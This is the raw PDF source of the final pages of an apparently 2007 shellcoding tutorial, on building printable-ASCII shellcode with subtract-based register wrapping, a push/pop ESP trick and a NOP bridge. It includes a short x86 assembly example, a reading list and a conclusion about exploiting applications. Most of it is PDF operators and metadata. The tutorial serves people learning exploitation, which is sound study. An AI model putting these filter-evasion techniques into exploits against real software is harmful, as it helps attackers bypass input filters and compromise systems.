(                -use a NOP bridge to ensure that there aren't any extran\eous bytes )Tj
T*
(that will crash our code.)Tj
T*
(                -profit)Tj
0 -1.1 TD
(        )Tj
/TT0 1 Tf
0 -2.294 TD
(But now I hear you clamoring that we can't use move nor can we subtract \from esp )Tj
0 -1.2 TD
(because they don't fall into printable characters!!! Settle down, have I\ got a )Tj
0 -1.2 TD
(solution for you! We will use subtract to place values into EAX, push th\e value to )Tj
T*
(the stack, then pop it into ESP. )Tj
0 -1.1 TD
( )Tj
T*
(Now you're wondering why I said subtract to put values into EAX, the pro\blem is we )Tj
0 -1.2 TD
(can't use add, and we can't directly assign nonprintable bytes. How can \we overcome )Tj
T*
(this? We can use the fact that each register has only 32 bits, so if we \force a wrap )Tj
T*
(around, we can arbitrarily assign values to a register using only printa\ble )Tj
T*
(characters with two to three subtract instructions.  )Tj
0 -1.1 TD
( )Tj
T*
(If the gears in your head aren't cranking yet, you should probably stop \reading )Tj
0 -1.2 TD
(right now.  )Tj
ET
0.5 0.5 0.5 rg
8.338 314.25 m
8.338 315.917 l
603.662 315.917 l
602.828 315.083 l
9.172 315.083 l
9.172 315.083 l
h
f
0.875 0.875 0.875 rg
603.662 315.917 m
603.662 314.25 l
8.338 314.25 l
9.172 315.083 l
602.828 315.083 l
602.828 315.083 l
h
f
0 0 0 rg
BT
/T1_1 1 Tf
11.673 0 0 11.673 8.3379 282.4891 Tm
(        The log awaited ASCII diagram)Tj
0 -1.2 TD
(        1\))Tj
T*
(        EIP\(loader code\) --------ALLOCATED STACK SPACE--------ESP)Tj
0 -2.4 TD
(        2\))Tj
0 -1.2 TD
(        ---\(loader code\)---EIP-------STACK------ESP--\(shellcode--)Tj
0 -2.4 TD
(        3\))Tj
0 -1.2 TD
(        ----loadercode---EIP@ESP----shellcode that was builts---)Tj
0 -1.1 TD
(        )Tj
ET
0.5 0.5 0.5 rg
8.338 131.483 m
8.338 133.151 l
603.662 133.151 l
602.828 132.317 l
9.172 132.317 l
9.172 132.317 l
h
f
0.875 0.875 0.875 rg
603.662 133.151 m
603.662 131.483 l
8.338 131.483 l
9.172 132.317 l
602.828 132.317 l
602.828 132.317 l
h
f
0 0 0 rg
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 101.631 Tm
(So, that diagram probably warrants some explanation. Basically, we take \our already )Tj
0 -1.2 TD
(written shellcode, and generate two to three subtract instructions per f\our bytes )Tj
T*
(and do the push EAX, pop ESP trick. This basically places the constructe\d shellcode )Tj
0 -1.2 TD
(at the end of the stack and works towards the EIP. So we construct 4 byt\es at a time )Tj
0 -1.2 TD
(for the entirety of the code and then insert a small NOP bridge \(indica\ted by @\) )Tj
ET
EMC 
/Artifact <</Attached [/Bottom ]/Type /Pagination /BBox [18 6.4959 582 14 ]>>BDC 
Q
BT
/T1_0 1 Tf
7.5041 0 0 7.5041 18 8.3052 Tm
(http://vividmachines.com/shellcode/shellcode.html \(19 of 21\)3/27/2007 \7:53:51 AM)Tj
ET
EMC 

endstreamendobj165 0 obj<</Length 4574>>stream
/Artifact <</Attached [/Top ]/Type /Pagination /BBox [18 779.4959 582 787 ]>>BDC 
0 0 0 rg
0 i 
BT
/T1_0 1 Tf
0 Tc 0 Tw 0  Ts 100  Tz 0 Tr 7.5041 0 0 7.5041 18 781.3052 Tm
(Shellcoding for Linux and Windows Tutorial)Tj
ET
EMC 
/Article <</MCID 0 >>BDC 
q
0 18 612 756 re
W* n
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 759.1558 Tm
(between the builder code and the shellcode. The NOP bridge is used to wo\rd align the )Tj
0 -1.2 TD
(end of the builder code.  )Tj
0 -1.1 TD
( )Tj
/TT1 1 Tf
0 -1.285 TD
(Example code:)Tj
/TT0 1 Tf
( )Tj
ET
0.5 0.5 0.5 rg
8.338 688.132 m
8.338 689.799 l
603.662 689.799 l
602.828 688.966 l
9.172 688.966 l
9.172 688.966 l
h
f
0.875 0.875 0.875 rg
603.662 689.799 m
603.662 688.132 l
8.338 688.132 l
9.172 688.966 l
602.828 688.966 l
602.828 688.966 l
h
f
0 0 0 rg
BT
/T1_1 1 Tf
11.673 0 0 11.673 8.3379 658.2056 Tm
(        and eax, 0x454e4f4a     ;  example of how to zero out eax\(unrel\ated\))Tj
0 -1.2 TD
(        and eax, 0x3a313035)Tj
T*
(        )Tj
0 -1.2 TD
(        )Tj
0 -1.2 TD
(        push esp)Tj
T*
(        pop eax)Tj
T*
(        sub eax, 0x39393333     ; construct 860 bytes of room on the sta\ck)Tj
T*
(        sub eax, 0x72727550     )Tj
0 -1.2 TD
(        sub eax, 0x54545421)Tj
T*
(        )Tj
T*
(        push eax                ; save into esp)Tj
T*
(        pop esp)Tj
0 -1.1 TD
(        )Tj
ET
0.5 0.5 0.5 rg
8.338 481.019 m
8.338 482.687 l
603.662 482.687 l
602.828 481.853 l
9.172 481.853 l
9.172 481.853 l
h
f
0.875 0.875 0.875 rg
603.662 482.687 m
603.662 481.019 l
8.338 481.019 l
9.172 481.853 l
602.828 481.853 l
602.828 481.853 l
h
f
0 0 0 rg
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 451.1667 Tm
(Oh, and I forgot to mention, the code must be inserted in reverse order \and the )Tj
0 -1.2 TD
(bytes must adhere to the little endian standard. That job sounds incredi\bly tedious, )Tj
T*
(thank god that matrix )Tj
ET
0 0 1 RG
0.56 w 10 M 0 j 0 J []0 d 
162.422 421.47 m
246.468 421.47 l
S
0 0 1 rg
BT
/TT0 1 Tf
11.673 0 0 11.673 162.4218 423.1514 Tm
(wrote a tool)Tj
0 0 0 rg
( that does it for us! The point is that now you )Tj
-13.2 -1.343 Td
(can use this utility only once you understand the concepts presented abo\ve. )Tj
0 -1.2 TD
(Remember, if you don't understand it, you're just another script kiddie.\ )Tj
/T1_0 1 Tf
0 -2.616 TD
( )Tj
0 -1 TD
( )Tj
/TT2 1 Tf
16.1626 0 0 16.1626 8.3379 336.6106 Tm
(Further Reading)Tj
/T1_0 1 Tf
11.673 0 0 11.673 153.8017 336.6106 Tm
( )Tj
/TT0 1 Tf
-12.462 -2.705 Td
(Below is a list of great resources that relate to shellcoding. I suggest\ picking up )Tj
0 -1.2 TD
(a copy of all of the documents listed, but if that is an impossibility, \at the very )Tj
ET
0 0 0 RG
78.376 275.34 m
253.471 275.34 l
S
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 277.0205 Tm
(least get The Shellcoder's Handbook; it is a pure goldmine of informatio\n.)Tj
/T1_2 1 Tf
5.8365 0 0 5.8365 29.7771 245.4088 Tm
(l)Tj
/T1_0 1 Tf
(     )Tj
ET
0.517 w 
41.689 243.857 m
203.316 243.857 l
S
BT
/TT0 1 Tf
10.7751 0 0 10.7751 41.6894 245.4088 Tm
(The Shellcoder's Handbook by Jack Koziol et al)Tj
/T1_0 1 Tf
11.673 0 0 11.673 339.0821 245.4088 Tm
( )Tj
/T1_2 1 Tf
5.8365 0 0 5.8365 29.7771 230.0877 Tm
(l)Tj
/T1_0 1 Tf
(     )Tj
ET
41.689 228.536 m
255.036 228.536 l
S
BT
/TT0 1 Tf
10.7751 0 0 10.7751 41.6894 230.0877 Tm
(Hacking - The Art of Exploitation by Jon Erickson)Tj
/T1_0 1 Tf
11.673 0 0 11.673 358.4773 230.0877 Tm
( )Tj
/T1_2 1 Tf
5.8365 0 0 5.8365 29.7771 217.1576 Tm
(l)Tj
/T1_0 1 Tf
(     )Tj
/TT0 1 Tf
10.7751 0 0 10.7751 41.6894 217.1576 Tm
("Understanding Windows Shellcode" by nologin.org)Tj
/T1_0 1 Tf
11.673 0 0 11.673 8.3379 185.9048 Tm
( )Tj
/TT2 1 Tf
16.1626 0 0 16.1626 8.3379 154.2449 Tm
(Conclusion)Tj
0 -2.18 TD
(    )Tj
/TT0 1 Tf
11.673 0 0 11.673 47.1282 119.0077 Tm
(At this point the reader should be able to write at the very least basic\ )Tj
-3.323 -1.348 Td
(shellcode to exploit applications on either the windows or linux platfor\ms. The )Tj
0 -1.2 TD
(tricks demonstrated here will help a shellcoder understand other's shell\code and )Tj
0 -1.2 TD
(modify prewritten shellcode to fit the situation at hand. Shellcoding is\ always )Tj
T*
(looked at as a minor detail of hacking a piece of software but invariabl\y, a hack is )Tj
T*
(only as strong enough as its weakest link. If the shellcode doesn't work\, then the )Tj
ET
EMC 
/Artifact <</Attached [/Bottom ]/Type /Pagination /BBox [18 6.4959 582 14 ]>>BDC 
Q
BT
/T1_0 1 Tf
7.5041 0 0 7.5041 18 8.3052 Tm
(http://vividmachines.com/shellcode/shellcode.html \(20 of 21\)3/27/2007 \7:53:51 AM)Tj
ET
EMC 

endstreamendobj166 0 obj(Shellcoding for Linux and Windows Tutorial)endobj167 0 obj<</C 171 0 R/V 1.25>>endobj168 0 obj<</URL(http://vividmachines.com/shellcode/shellcode.html)/S 169 0 R>>endobj169 0 obj<</G 170 0 R>>endobj170 0 obj<</CB 0/M[10.08 10.08 26.0 36.0]/S 0/PO 0/PS[792.0 612.0]/AH 0/AL 0/SU 1/AS 1/AT 70>>endobj171 0 obj[168 0 R]endobj172 0 obj(http://vividmachines.com/shellcode/shellcode.html)endobj173 0 obj(5‘`ˇ2Ësı5ŸO√¡yÊ)endobj174 0 obj<</TS(D:20070327135351)/ID 173 0 R/CT(text/html)/O[11 0 R 38 0 R 43 0 R 51 0 R 64 0 R 67 0 R 69 0 R 72 0 R 74 0 R 78 0 R 81 0 R 94 0 R 97 0 R 101 0 R 105 0 R 108 0 R 112 0 R 118 0 R 122 0 R 125 0 R 132 0 R]/S/SPS/T 166 0 R/TID 176 0 R/SI 175 0 R>>endobj175 0 obj<</TS(D:20070327135351)/AU 172 0 R>>endobj176 0 obj(ºMÿØB‰9S~Z1úJ™ëÙ)endobj177 0 obj<</Names[173 0 R 174 0 R]>>endobj178 0 obj<</Names[172 0 R 174 0 R]>>endobj179 0 obj<</First 180 0 R/Parent 5 0 R/Count 1/Last 180 0 R/Title(vividmachines.com)>>endobj180 0 obj<</Parent 179 0 R/Dest[11 0 R/XYZ 0 792 null]/SE 10 0 R/Title(Shellcoding for Linux and Windows Tutorial)>>endobj181 0 obj<</Subtype/XML/Length 3416/Type/Metadata>>stream
<?xpacket begin="Ôªø" id="W5M0MpCehiHzreSzNTczkc9d"?>
<x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="3.1-702">
   <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
      <rdf:Description rdf:about=""
            xmlns:xap="http://ns.adobe.com/xap/1.0/">
         <xap:ModifyDate>2007-03-27T07:53:51-06:00</xap:ModifyDate>
         <xap:CreateDate>2007-03-27T07:53:43-06:00</xap:CreateDate>
         <xap:MetadataDate>2007-03-27T07:53:51-06:00</xap:MetadataDate>
      </rdf:Description>
      <rdf:Description rdf:about=""
            xmlns:dc="http://purl.org/dc/elements/1.1/">
         <dc:format>application/pdf</dc:format>
         <dc:title>
            <rdf:Alt>
               <rdf:li xml:lang="x-default">Shellcoding for Linux and Windows Tutorial</rdf:li>
            </rdf:Alt>
         </dc:title>
      </rdf:Description>
      <rdf:Description rdf:about=""
            xmlns:xapMM="http://ns.adobe.com/xap/1.0/mm/">
         <xapMM:DocumentID>uuid:5f7e8de6-c018-4459-bf5c-b23dd4ed1252</xapMM:DocumentID>
         <xapMM:InstanceID>uuid:e9e09b1c-0d43-4bde-8de4-3d701f2ec33a</xapMM:InstanceID>
      </rdf:Description>
      <rdf:Description rdf:about=""
            xmlns:pdf="http://ns.adobe.com/pdf/1.3/">
         <pdf:Producer>Acrobat Web Capture 7.0</pdf:Producer>
      </rdf:Description>
   </rdf:RDF>
</x:xmpmeta>
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                           
<?xpacket end="w"?>
endstreamendobjxref
0 182
0000000004 65535 f
0000000016 00000 n
0000000145 00000 n
0000000220 00000 n
0000000006 00000 f
0000000394 00000 n
0000000092 00001 f
0000000462 00000 n
0000000563 00000 n
0000000607 00000 n
0000000654 00000 n
0000001329 00000 n
0000001571 00000 n
0000001806 00000 n
0000001830 00000 n
0000001982 00000 n
0000002132 00000 n
0000002283 00000 n
0000002501 00000 n
0000002721 00000 n
0000002939 00000 n
0000003157 00000 n
0000003375 00000 n
0000003593 00000 n
0000003818 00000 n
0000004044 00000 n
0000004269 00000 n
0000004487 00000 n
0000004717 00000 n
0000004947 00000 n
0000005177 00000 n
0000005395 00000 n
0000005613 00000 n
0000005833 00000 n
0000006051 00000 n
0000006109 00000 n
0000006616 00000 n
0000006659 00000 n
0000006702 00000 n
0000006932 00000 n
0000006956 00000 n
0000007112 00000 n
0000007143 00000 n
0000007324 00000 n
0000007555 00000 n
0000007579 00000 n
0000007731 00000 n
0000007762 00000 n
0000007805 00000 n
0000007848 00000 n
0000007891 00000 n
0000008066 00000 n
0000008308 00000 n
0000008332 00000 n
0000008504 00000 n
0000008577 00000 n
0000008757 00000 n
0000008930 00000 n
0000009104 00000 n
0000009277 00000 n
0000009453 00000 n
0000009626 00000 n
0000009801 00000 n
0000009844 00000 n
0000009887 00000 n
0000010103 00000 n
0000010127 00000 n
0000010170 00000 n
0000010375 00000 n
0000010399 00000 n
0000010627 00000 n
0000010651 00000 n
0000010694 00000 n
0000010899 00000 n
0000010923 00000 n
0000011151 00000 n
0000011175 00000 n
0000011217 00000 n
0000011260 00000 n
0000011476 00000 n
0000011500 00000 n
0000011543 00000 n
0000011739 00000 n
0000011832 00000 n
0000011925 00000 n
0000013101 00000 n
0000013336 00000 n
0000014507 00000 n
0000014736 00000 n
0000014826 00000 n
0000014912 00000 n
0000016090 00000 n
0000000095 00001 f
0000016328 00000 n
0000016352 00000 n
0000000099 00001 f
0000016559 00000 n
0000016583 00000 n
0000016790 00000 n
0000000102 00001 f
0000016856 00000 n
0000016881 00000 n
0000000106 00001 f
0000017089 00000 n
0000017114 00000 n
0000017159 00000 n
0000000110 00001 f
0000017378 00000 n
0000017403 00000 n
0000017611 00000 n
0000000115 00001 f
0000017707 00000 n
0000017732 00000 n
0000017940 00000 n
0000019124 00000 n
0000000119 00001 f
0000019369 00000 n
0000019394 00000 n
0000019439 00000 n
0000000123 00001 f
0000019671 00000 n
0000019696 00000 n
0000019740 00000 n
0000000126 00001 f
0000019949 00000 n
0000019974 00000 n
0000000134 00001 f
0000020232 00000 n
0000020257 00000 n
0000020437 00000 n
0000020463 00000 n
0000020508 00000 n
0000020553 00000 n
0000020750 00000 n
0000000136 00001 f
0000020857 00000 n
0000000137 00001 f
0000000138 00001 f
0000000139 00001 f
0000000140 00001 f
0000000141 00001 f
0000000142 00001 f
0000000143 00001 f
0000000144 00001 f
0000000000 00001 f
0000020882 00000 n
0000026155 00000 n
0000030742 00000 n
0000035405 00000 n
0000040321 00000 n
0000043288 00000 n
0000046788 00000 n
0000050091 00000 n
0000054234 00000 n
0000057609 00000 n
0000061253 00000 n
0000063898 00000 n
0000064915 00000 n
0000067904 00000 n
0000072459 00000 n
0000076288 00000 n
0000078968 00000 n
0000084187 00000 n
0000088493 00000 n
0000092892 00000 n
0000097022 00000 n
0000101648 00000 n
0000101709 00000 n
0000101747 00000 n
0000101833 00000 n
0000101864 00000 n
0000101966 00000 n
0000101992 00000 n
0000102060 00000 n
0000102095 00000 n
0000102359 00000 n
0000102412 00000 n
0000102447 00000 n
0000102491 00000 n
0000102535 00000 n
0000102629 00000 n
0000102753 00000 n
trailer
<</Size 182/Root 1 0 R/Info 3 0 R/ID[<52B62EC82E08AB459F82F65ED9079979><629F41DB32FF3142A9D5F3813AA4AE0D>]>>
startxref
106247
%%EOF
